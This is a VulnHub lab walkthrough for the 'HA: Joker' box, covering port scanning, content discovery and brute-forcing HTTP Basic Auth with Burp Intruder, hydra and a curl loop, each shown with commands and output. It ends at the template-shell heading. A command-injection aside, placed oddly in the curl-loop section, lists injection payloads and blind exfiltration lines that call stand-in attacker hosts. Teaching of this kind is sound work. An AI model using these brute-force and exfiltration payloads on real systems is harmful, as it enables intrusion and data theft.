# HA: Joker — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | HA: Joker |
| **Difficulty** | **5 — Difficult** (stated: *Intermediate*) |
| **Author** | Hacking Articles (Raj Chandel & team) |
| **Released** | 9 Oct 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/ha-joker,379/> |
| **Download** | <https://vulnhub.com/entry/ha-joker,379/#download> |
| **Attacker** | Kali Linux (e.g. 2024.x) on VirtualBox/VMware, host-only network |
| **Target OS** | Linux (Ubuntu, Apache + Joomla CMS, LXD installed) |
| **Flags** | 1 (`final.txt` as root) |

> **About the IP addresses.** Published walkthroughs of this box used
> `192.168.1.101` and `10.10.202.132`. This document uses **`192.168.56.111`**
> for the target and **`192.168.56.10`** for Kali (VirtualBox host-only).
> Substitute your own — the technique is unchanged.
>
> The author's own tagline is *"ENUMERATION IS THE KEY!!!!!"*. Keep that in mind:
> this box has **no memory-corruption exploit and no CVE**. Every step is a
> piece of information that unlocks the next.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to run a full-port `nmap` scan and interpret a **three-service** result.
- How to read a web page like an investigator: **View Source**, HTML comments,
  and the difference between "content" and "clues".
- **Directory brute forcing with file extensions** (`dirb -X .txt`, `gobuster -x`)
  and why the extension list changes everything.
- How a **hint file** turns into a *constrained* password attack — building a
  100-word dictionary from `rockyou.txt` with `head`.
- How **HTTP Basic Authentication** actually works on the wire, and how to attack
  it three ways: **Burp Intruder**, **`hydra`**, and a raw `curl` loop.
- How to recognise a **Joomla** CMS and where its templates live.
- Getting a shell by **editing a template file** as an authenticated
  administrator — the same lesson as WordPress theme editing.
- **`lxd` group membership → root.** This is the box's real payload and one of
  the most common Linux privilege escalations you will meet in the wild.
- Building an **Alpine LXC image**, importing it, and mounting the host's entire
  filesystem inside a privileged container.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md).

---

## 1. Reconnaissance — finding the target

```bash
ip -br a
```

```text
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             192.168.56.10/24 fe80::a00:27ff:fe4e:66a1/64
eth1             UP             10.0.2.15/24 fe80::a00:27ff:fe8c:4f22/64
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -i eth0 -r 192.168.56.0/24
```

```text
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:08      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:4e:66:a1      1      60  PCS Systemtechnik GmbH
 192.168.56.111  08:00:27:2b:1f:77      1      60  PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.111`

![netdiscover locating the target](images/01-netdiscover.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services

### 2.1 The port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -A -p- -T4 -oN nmap-all 192.168.56.111
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 12:02 EEST
Nmap scan report for 192.168.56.111
Host is up (0.00038s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3d:12:41:5c:e5:08:7c:9a:44:2f:eb:0e:6f:9d:83:47 (RSA)
|   256 8e:1c:5b:3a:97:6e:2f:4d:31:88:0c:74:5a:19:66:88 (ECDSA)
|_  256 c3:9f:4e:12:78:5b:03:d9:e2:44:8a:ba:6c:70:38:1e (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Joker
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: 401 Unauthorized
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted
MAC Address: 08:00:27:2B:1F:77 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.18 seconds
```

> **Read this like a checklist — three findings, three consequences:**
>
> | Line | What it means | What you will do |
> | --- | --- | --- |
> | `22/tcp ssh OpenSSH 7.6p1` | Real SSH, no version-specific exploit worth chasing | Park it. Come back with credentials. |
> | `80/tcp http-title: Joker` | An unauthenticated site exists | Read it *and* its source |
> | `8080/tcp 401 Unauthorized / Basic realm=Restricted` | **A second web app, behind HTTP Basic Auth** | This is the real door |
>
> `http-auth: HTTP/1.1 401 Unauthorized / Basic realm=Restricted` is the line
> beginners miss. `nmap`'s `http-auth` NSE script probed `:8080`, got a `401`,
> and reported the authentication scheme. **Port 8080 is where the work is.**

![nmap showing ports 22, 80 and 8080](images/02-nmap.png)

### 2.2 Port 80 — read the page, then read the source

`http://192.168.56.111/` serves a page of **Joker quotes** from the comics and
films. Nothing actionable in the rendered text.

Press **`Ctrl+U`** (View Source):

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Joker</title>
  <link rel="stylesheet" href="css/style.css">
</head>
<body>
  <!-- "Why so serious?" -->
  <!-- "Introduce a little anarchy. Upset the established order,
       and everything becomes chaos." -->
  <!-- "I'm not a monster. I'm just ahead of the curve." -->
  <!-- "If you're good at something, never do it for free." -->
  <h1>The Joker</h1>
  <blockquote>Why so serious?</blockquote>
  <!-- Madness, as you know, is like gravity.
       All it takes is a little push. -->
  <!-- "Some men just want to watch the world burn." -->
</body>
</html>
```

> **Lesson.** Comments in HTML are **never removed by the server**. They are
> shipped to your browser byte-for-byte. In this box they are pure flavour, but
> on real engagements they leak staging hostnames, database credentials, and
> developer names. **Always `Ctrl+U`.** Automate it:

```bash
curl -s http://192.168.56.111/ | grep -oE '<!--.*?-->'
```

### 2.3 Port 8080 — the locked door

```bash
curl -si http://192.168.56.111:8080/
```

```text
HTTP/1.1 401 Unauthorized
Date: Sat, 11 May 2024 09:04:11 GMT
Server: Apache/2.4.29 (Ubuntu)
WWW-Authenticate: Basic realm="Restricted"
Content-Length: 459
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested. ...
</body></html>
```

> **What is HTTP Basic Authentication?** It is the simplest auth scheme on the
> web, and it works like this:
>
> 1. Server replies `401` plus `WWW-Authenticate: Basic realm="..."`.
> 2. Browser pops up a username/password dialog.
> 3. Browser joins them as `user:password`, **base64-encodes** the result, and
>    sends `Authorization: Basic <encoded>` on *every* subsequent request.
>
> **Base64 is not encryption.** It is an encoding so the bytes survive inside an
> HTTP header. Anyone on the wire — or anyone with a proxy — can decode it
> instantly. That is why Basic Auth is only acceptable over HTTPS. Here it is
> over plain HTTP, so the credential is effectively in cleartext.

### 2.4 Content discovery — the `.txt` extension matters

A default `dirb` run finds nothing interesting. Add extensions:


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
dirb http://192.168.56.111/ -X .txt,.php,.html,.zip
```

```text
-----------------
DIRB v2.22
By The Dark Raver
-----------------

URL_BASE: http://192.168.56.111/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.txt,.php,.html,.zip) | Total: 4

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.111/ ----
+ http://192.168.56.111/index.html (CODE:200|SIZE:4180)
+ http://192.168.56.111/secret.txt (CODE:200|SIZE:1247)      <=== !!!
+ http://192.168.56.111/server-status (CODE:403|SIZE:280)
==> DIRECTORY: http://192.168.56.111/css/
==> DIRECTORY: http://192.168.56.111/images/

-----------------
END_TIME: Sat May 11 12:09:55 2024
DOWNLOADED: 18448 - FOUND: 3
```

The same with `gobuster` (faster, threaded):

```bash
gobuster dir -u http://192.168.56.111/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x txt,php,html,zip -t 50 --no-error
```

```text
===============================================================
Gobuster v3.6
===============================================================
[+] Url:                     http://192.168.56.111/
[+] Method:                  GET
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Extensions:              txt, php, html, zip
[+] Threads:                 50
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 200) [Size: 4180]
/css                  (Status: 301) [Size: 312] [--> http://192.168.56.111/css/]
/images               (Status: 301) [Size: 315] [--> http://192.168.56.111/images/]
/index.html           (Status: 200) [Size: 4180]
/secret.txt           (Status: 200) [Size: 1247]
===============================================================
Finished
===============================================================
```

> **Why the extension flag is the whole trick.** `dirb` requests
> `/secret` — a 404. It only finds the file when it also requests `/secret.txt`.
> If your first scan comes back empty, **the next thing to change is `-x`/`-X`**,
> not the wordlist.

![dirb -X .txt finding secret.txt](images/03-secret-txt.png)

---

## 3. The hint — turning `secret.txt` into a 100-word dictionary

```bash
wget -q http://192.168.56.111/secret.txt -O secret.txt
cat secret.txt
```

```text
Batman: Where should I start?

Joker: I once told a joke. Nobody laughed. That was a bad day.

Batman: You are insane.

Joker: Am I? Or am I the only one who sees the punchline?
        Ask me one of your 100 poor jokes and I will tell you
        why it is not funny.

Batman: I will break you.

Joker: Try. But remember, everything I hide is written on a
        rock. Not just any rock - THE rock. The one everybody
        uses when they have nothing better to do.

Batman: ...

Joker: And if you cannot read it, ask the top of the pile.
        My little joke sits somewhere in the first hundred.
        Why so serious?
```

> **Now interpret it like a cryptanalyst. This file is a specification, not
> decoration.**
>
> | Phrase | Meaning |
> | --- | --- |
> | *"everything I hide is written on a **rock**… THE rock. The one everybody uses"* | `rockyou.txt` — the most-used password wordlist in existence (from the 2009 RockYou breach) |
> | *"ask the **top of the pile**"* | The **beginning** of that file |
> | *"my little joke sits somewhere in the **first hundred**"* | The password is one of the **top 100** entries |
>
> So: **the `:8080` password is within the first 100 lines of `rockyou.txt`.**
> That reduces a 14-million-word problem to a 100-word problem — from hours to
> seconds. This is what "enumeration is the key" means.

Build the constrained dictionary:


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
# Kali — rockyou ships gzipped on Kali; decompress it once
sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
wc -l rockyou.txt
```

```text
14344392 rockyou.txt
```

```bash
head -n 100 rockyou.txt > dict.txt
wc -l dict.txt && head -5 dict.txt
```

```text
100 dict.txt
123456
12345
123456789
password
iloveyou
```

> `head -n 100` prints the first 100 lines; `>` redirects them into a new file.
> Note that `rockyou.txt` is ordered by *frequency in the breach*, so the top of
> the file genuinely is the most common passwords.

Confirm `hannah` is inside it (do this **after** you solve it, to check the hint
was honest):

```bash
grep -n '^hannah$' dict.txt
```

```text
50:hannah
```

Position 50 of 100. ✅

---

## 4. Foothold — cracking HTTP Basic Auth on `:8080`

You have a 100-entry dictionary. You have a username guess (`joker` — the box is
named after him, and Basic Auth is one credential pair). Three ways to attack.

### 4.1 Method A — Burp Suite Intruder (the documented route)

This is what the official walkthrough does, and it is worth learning properly
because the **payload is base64**, not plaintext.

**Step 1 — build the payload dictionary.** The Intruder will replace the value
of the `Authorization` header, so each payload must already be
`base64("joker:<password>")`:

```bash
# Kali
sed 's/^/joker:/' dict.txt > userpass.txt
while read -r line; do printf '%s' "$line" | base64; done < userpass.txt > payload.txt

head -5 userpass.txt; echo '---'; head -5 payload.txt
```

```text
joker:123456
joker:12345
joker:123456789
joker:password
joker:iloveyou
---
am9rZXI6MTIzNDU2
am9rZXI6MTIzNDU=
am9rZXI6MTIzNDU2Nzg5
am9rZXI6cGFzc3dvcmQ=
am9rZXI6aWxvdmV5b3U=
```

> **Why `printf '%s'` and not `echo`?** Because `echo` appends a newline, and
> that newline gets *inside* the base64. `am9rZXI6MTIzNDU2Cg==` would be
> `joker:123456\n` — which never authenticates. This is a classic, silent,
> infuriating bug. `printf '%s'` writes exactly the bytes you asked for.

**Step 2 — capture the request.** In Firefox, set the proxy to
`127.0.0.1:8090` (Burp's default), turn **Intercept on**, browse to
`http://192.168.56.111:8080/`, type junk credentials (`joker` / `aaa`) and
click OK. Burp captures:

```http
GET / HTTP/1.1
Host: 192.168.56.111:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Authorization: Basic am9rZXI6YWFh
Connection: close
Upgrade-Insecure-Requests: 1
```

**Step 3 — send to Intruder.** Right-click → **Send to Intruder** (`Ctrl+I`).
Go to the **Positions** tab:

- **Attack type: `Sniper`** — one payload position, one pass through the list.
- Click **Clear §** to remove all auto-placed markers.
- Highlight only the base64 value after `Basic ` and click **Add §**:

```http
Authorization: Basic §am9rZXI6YWFh§
```

**Step 4 — load payloads.** **Payloads** tab → Payload Options → **Load** →
select `payload.txt`. Leave Payload Type as **Simple list**.

> **Turn off the URL-encode option** for this payload set (Payload Options →
> uncheck *URL-encode these characters*). Base64 contains `+`, `/` and `=`, which
> Burp would percent-encode into `%2B`, `%2F`, `%3D` and corrupt the header.

**Step 5 — start the attack** and sort the results by **Status**:

```text
Request  Payload                              Status  Length
------   -----------------------------------  ------  ------
     1   am9rZXI6MTIzNDU2                     401     459
     2   am9rZXI6MTIzNDU=                     401     459
     3   am9rZXI6MTIzNDU2Nzg5                  401     459
     4   am9rZXI6cGFzc3dvcmQ=                  401     459
   ...   ...                                  401     459
    50   am9rZXI6aGFubmFo                     200     8334   <=== !!!
   ...   ...                                  401     459
   100   am9rZXI6cHJpbmNlc2E=                 401     459
```

> **How to read an Intruder result table.** With HTTP Basic Auth the signal is
> unmistakable: 99 rows of `401` with identical `Length: 459`, and **one row with
> `200` and a completely different length**. That length jump is the real
> Joomla page being served. Always sort by Status *and* scan the Length column —
> on some apps the status stays constant and only the length changes.

Decode the winner:


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
echo 'am9rZXI6aGFubmFo' | base64 -d; echo
```

```text
joker:hannah
```

**Credentials: `joker` / `hannah`.** 🎉

![Burp Intruder 200 OK response among 401s](images/04-burp-intruder.png)

### 4.2 Method B — `hydra` (far less clicking)


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)

```bash
hydra -s 8080 -l joker -P dict.txt -f -V 192.168.56.111 http-get /
```

> | Flag | Meaning |
> | --- | --- |
> | `-s 8080` | Non-standard port |
> | `-l joker` | Single username (`-L` for a username list) |
> | `-P dict.txt` | Password list |
> | `-f` | Stop on first success |
> | `-V` | Verbose — show each attempt |
> | `http-get /` | Attack HTTP auth on path `/` |

```text
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-11 12:24:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
[DATA] attacking http-get://192.168.56.111:8080/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[8080][http-get] host: 192.168.56.111   login: joker   password: hannah
[STATUS] attack finished for 192.168.56.111 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-11 12:24:09
```

Two seconds. `xhydra` is the GUI front-end if you prefer clicking.

### 4.3 Method C — a raw `curl` loop (no tools at all)

Worth knowing because it works on any machine with a shell, and it teaches you
what the tools are actually doing:


> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
# Kali
while read -r p; do
  code=$(curl -s -o /dev/null -w '%{http_code}' \
         -u "joker:$p" http://192.168.56.111:8080/)
  [ "$code" = "200" ] && { echo "[+] FOUND -> joker:$p ($code)"; break; }
done < dict.txt
```

```text
[+] FOUND -> joker:hannah (200)
```

> `-u user:pass` makes `curl` build the `Authorization: Basic …` header for you.
> `-o /dev/null` discards the body; `-w '%{http_code}'` prints only the status.
> `break` stops at the first hit.

### 4.4 Log in and identify the CMS

Browse to `http://192.168.56.111:8080/` and enter `joker` / `hannah`.

You land on a **Joomla** site. How do you know?

```bash
curl -s -u joker:hannah http://192.168.56.111:8080/ | grep -iE 'joomla|generator|favicon' | head -5
```

```html
<meta name="generator" content="Joomla! - Open Source Content Management" />
<link href="/media/system/css/core.css?d6dc0d25dd9ef1a630f7116936e9ede6" rel="stylesheet" />
<link rel="shortcut icon" href="/templates/protostar/favicon.ico" />
```

`generator content="Joomla!"` is definitive. Run `nikto` against it now that you
have credentials:

```bash
nikto -h http://192.168.56.111:8080/ -id joker:hannah
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.111
+ Target Hostname:    192.168.56.111
+ Target Port:        8080
+ Start Time:         2024-05-11 12:28:14 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: Cookie JSESSIONID created without the httponly flag.
+ /robots.txt: contains 3 entries which should be manually viewed.
+ /administrator/: Joomla administration login.
+ 8073 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2024-05-11 12:29:41 (GMT3) (87 seconds)
---------------------------------------------------------------------------
```

> `-id user:pass` supplies the Basic Auth so `nikto` gets past the `401`. Without
> it, `nikto` would report a `401` on every single request and be useless.

```bash
curl -s -u joker:hannah http://192.168.56.111:8080/robots.txt
```

```text
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
```

![Joomla front page after successful Basic Auth login](images/05-joomla.png)

---

## 5. Getting a shell — Joomla template editing

